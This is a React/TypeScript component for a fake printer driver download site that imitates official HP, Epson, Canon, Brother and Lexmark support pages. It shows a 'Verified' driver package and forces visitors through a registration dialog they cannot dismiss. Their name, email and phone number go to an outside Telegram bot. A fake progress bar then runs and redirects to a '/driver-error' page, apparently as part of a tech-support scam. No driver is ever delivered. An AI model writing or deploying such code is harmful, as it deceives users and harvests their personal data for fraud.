import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Printer,
  Download,
  HardDrive,
  Globe,
  Shield,
  ChevronRight,
  AlertCircle,
} from "lucide-react";

interface FormData {
  name: string;
  email: string;
  phone: string;
}

const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

const PRINTER_BRANDS = {
  'HP': /^(HP|hp)-|^(deskjet|officejet|laserjet)/i,
  'Epson': /^(EPSON|epson)|^(L|WF|ET|XP)-/i,
  'Canon': /^(CANON|canon)|^(MG|MX|TR|TS|MB)/i,
  'Brother': /^(BROTHER|brother)|^(HL|MFC|DCP)-/i,
  'Lexmark': /^(LEXMARK|lexmark)|^(MS|MX|CS|CX)/i
};

const DriverDownload = () => {
  const navigate = useNavigate();
  const [modelNumber, setModelNumber] = useState("");
  const [detectedBrand, setDetectedBrand] = useState("");
  const [operatingSystem, setOperatingSystem] = useState("");
  const [showDrivers, setShowDrivers] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [formData, setFormData] = useState<FormData>({
    name: "",
    email: "",
    phone: "",
  });
  const { toast } = useToast();

  useEffect(() => {
    // Detect OS on component mount
    const detectOS = () => {
      const userAgent = window.navigator.userAgent;
      if (userAgent.indexOf("Windows NT 10.0") !== -1) return "windows10";
      if (userAgent.indexOf("Windows NT 11.0") !== -1) return "windows11";
      if (userAgent.indexOf("Mac") !== -1) return "macos";
      if (userAgent.indexOf("Linux") !== -1) return "linux";
      return "";
    };
    setOperatingSystem(detectOS());
  }, []);

  useEffect(() => {
    // Detect printer brand when model number changes
    const detectPrinterBrand = (model: string) => {
      for (const [brand, regex] of Object.entries(PRINTER_BRANDS)) {
        if (regex.test(model)) {
          setDetectedBrand(brand);
          toast({
            title: "Brand Detected",
            description: `Detected ${brand} printer model`,
          });
          return;
        }
      }
      setDetectedBrand("");
    };

    if (modelNumber.trim()) {
      detectPrinterBrand(modelNumber);
    }
  }, [modelNumber, toast]);

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (modelNumber.trim() && operatingSystem) {
      setShowDrivers(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
      toast({
        title: "Drivers Found",
        description: `Compatible ${detectedBrand} drivers found for ${operatingSystem}`,
      });
    }
  };

  // Rest of the component remains the same...
  const sendToTelegram = async (data: FormData) => {
    const message = `
New Driver Download Request:
Brand: ${detectedBrand}
Name: ${data.name}
Email: ${data.email}
Phone: ${data.phone}
Model: ${modelNumber}
OS: ${operatingSystem}
    `;

    try {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
          }),
        }
      );
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
    }
  };

  const handleDownload = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendToTelegram(formData);
    setShowForm(false);
    setDownloading(true);
    window.scrollTo({ top: 0, behavior: "smooth" });
    toast({
      title: "Download Initiated",
      description: `Your ${detectedBrand} driver package is being prepared for download...`,
    });

    for (let i = 0; i <= 100; i += 10) {
      await new Promise((resolve) => setTimeout(resolve, 800));
      setProgress(i);
    }

    setDownloading(false);
    navigate('/driver-error');
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-white">
      <div className="container mx-auto px-4 py-12">
        <div className="max-w-5xl mx-auto">
          <div className="text-center mb-12">
            <div className="flex justify-center mb-6">
              <Printer className="h-20 w-20 text-primary" />
            </div>
            <h1 className="text-4xl font-bold text-gray-900 mb-4">
              {detectedBrand ? `${detectedBrand} Printer Drivers` : "Software & Driver Downloads"}
            </h1>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              {detectedBrand 
                ? `Download the latest ${detectedBrand} drivers, software, and firmware for your printer.`
                : "Download the latest drivers, software, and firmware for your printer."}
            </p>
          </div>

          {!showDrivers && (
            <Card className="mb-8">
              <CardHeader>
                <CardTitle>Find Your Printer</CardTitle>
                <CardDescription>
                  Enter your printer model number - we'll automatically detect your printer brand and operating system
                </CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleSearch} className="space-y-6">
                  <div className="grid md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <Label htmlFor="model">Printer Model Number</Label>
                      <Input
                        id="model"
                        placeholder="e.g., HP-452 or EPSON-L805"
                        value={modelNumber}
                        onChange={(e) => setModelNumber(e.target.value)}
                        required
                        className="h-12"
                      />
                      {detectedBrand && (
                        <p className="text-sm text-green-600 mt-2">
                          ✓ Detected {detectedBrand} printer
                        </p>
                      )}
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="os">Operating System</Label>
                      <Select
                        value={operatingSystem}
                        onValueChange={setOperatingSystem}
                        required
                      >
                        <SelectTrigger className="h-12">
                          <SelectValue placeholder="Auto-detected OS" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="windows11">Windows 11</SelectItem>
                          <SelectItem value="windows10">Windows 10</SelectItem>
                          <SelectItem value="macos">macOS Sonoma</SelectItem>
                          <SelectItem value="linux">Linux</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>
                  <div className="flex justify-end">
                    <Button 
                      type="submit" 
                      size="lg" 
                      className="min-w-[200px]"
                      disabled={!modelNumber.trim() || !operatingSystem}
                    >
                      Find Drivers
                      <ChevronRight className="ml-2 h-4 w-4" />
                    </Button>
                  </div>
                </form>
              </CardContent>
            </Card>
          )}

          {/* Rest of the component JSX remains the same... */}
          {showDrivers && !downloading && (
            <div className="space-y-6 animate-fadeIn">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Printer className="h-6 w-6 text-primary" />
                    {detectedBrand} {modelNumber} - Available Downloads
                  </CardTitle>
                  <CardDescription>
                    The following software and drivers are available for your {detectedBrand} printer
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="grid gap-6">
                    <div className="border rounded-lg p-6">
                      <div className="flex items-start justify-between">
                        <div>
                          <h3 className="text-lg font-semibold mb-2">
                            Essential Driver Package
                          </h3>
                          <p className="text-gray-600 mb-4">
                            Recommended {detectedBrand} driver package for {operatingSystem}
                          </p>
                          <div className="flex items-center gap-6 text-sm text-gray-500">
                            <div className="flex items-center gap-2">
                              <HardDrive className="h-4 w-4" />
                              Size: 125MB
                            </div>
                            <div className="flex items-center gap-2">
                              <Globe className="h-4 w-4" />
                              Version: 5.2.1
                            </div>
                            <div className="flex items-center gap-2">
                              <Shield className="h-4 w-4" />
                              Verified
                            </div>
                          </div>
                        </div>
                        <Button
                          size="lg"
                          onClick={() => setShowForm(true)}
                          className="min-w-[140px]"
                        >
                          <Download className="mr-2 h-4 w-4" />
                          Download
                        </Button>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {/* Download progress card remains the same... */}
          {downloading && (
            <Card className="animate-fadeIn">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Download className="h-6 w-6 text-primary" />
                  Downloading {detectedBrand} Driver Package
                </CardTitle>
                <CardDescription>
                  Please wait while we prepare your download...
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div className="h-2 w-full bg-gray-100 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-primary transition-all duration-500 rounded-full"
                      style={{ width: `${progress}%` }}
                    />
                  </div>
                  <div className="flex items-center justify-between text-sm text-gray-600">
                    <span>{progress}% Complete</span>
                    <span>{Math.round((125 * progress) / 100)} MB of 125 MB</span>
                  </div>
                  {progress < 100 && (
                    <div className="flex items-center gap-2 text-gray-600 mt-4">
                      <AlertCircle className="h-4 w-4" />
                      <span className="text-sm">Please don't close this window</span>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          )}

          {/* Registration dialog remains the same... */}
          <Dialog open={showForm} onOpenChange={() => {}}>
            <DialogContent
              className="sm:max-w-md"
              onPointerDownOutside={(e) => e.preventDefault()}
            >
              <DialogHeader>
                <DialogTitle>Download Registration</DialogTitle>
                <DialogDescription>
                  Please provide your information to begin the download
                </DialogDescription>
              </DialogHeader>
              <form onSubmit={handleDownload} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="name">Full Name</Label>
                  <Input
                    id="name"
                    required
                    placeholder="Enter your full name"
                    value={formData.name}
                    onChange={(e) =>
                      setFormData({ ...formData, name: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input
                    id="email"
                    type="email"
                    required
                    placeholder="Enter your email address"
                    value={formData.email}
                    onChange={(e) =>
                      setFormData({ ...formData, email: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input
                    id="phone"
                    required
                    placeholder="Enter your phone number"
                    value={formData.phone}
                    onChange={(e) =>
                      setFormData({ ...formData, phone: e.target.value })
                    }
                  />
                </div>
                <Button type="submit" className="w-full">
                  Begin Download
                </Button>
                <p className="text-sm text-gray-500 text-center">
                  By downloading, you agree to our Terms of Service and Privacy Policy
                </p>
              </form>
            </DialogContent>
          </Dialog>
        </div>
      </div>
    </div>
  );
};

export default DriverDownload;